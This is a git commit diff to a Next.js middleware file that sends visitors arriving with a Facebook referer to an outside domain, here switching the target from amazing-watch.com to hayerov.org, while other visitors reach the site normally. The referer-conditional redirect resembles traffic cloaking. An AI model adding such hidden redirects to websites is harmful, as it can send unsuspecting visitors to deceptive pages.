262b331c5e9bf7da5eb89464ca66d166b654024e
andojan15 <161382477+andojan15@users.noreply.github.com>
2024-09-30 16:01:05 +0400

    middleware.js

--- middleware.js
+++ middleware.js
@@ -4,7 +4,7 @@ export function middleware(req) {
   const url = req.nextUrl.clone();
   const referer = req.headers.get("referer");
   if (referer?.includes("facebook")) {
-    const redirectUrl = `https://amazing-watch.com/${url.pathname}`;
+    const redirectUrl = `https://hayerov.org/${url.pathname}`;
     return NextResponse.redirect(redirectUrl);
   }
 }
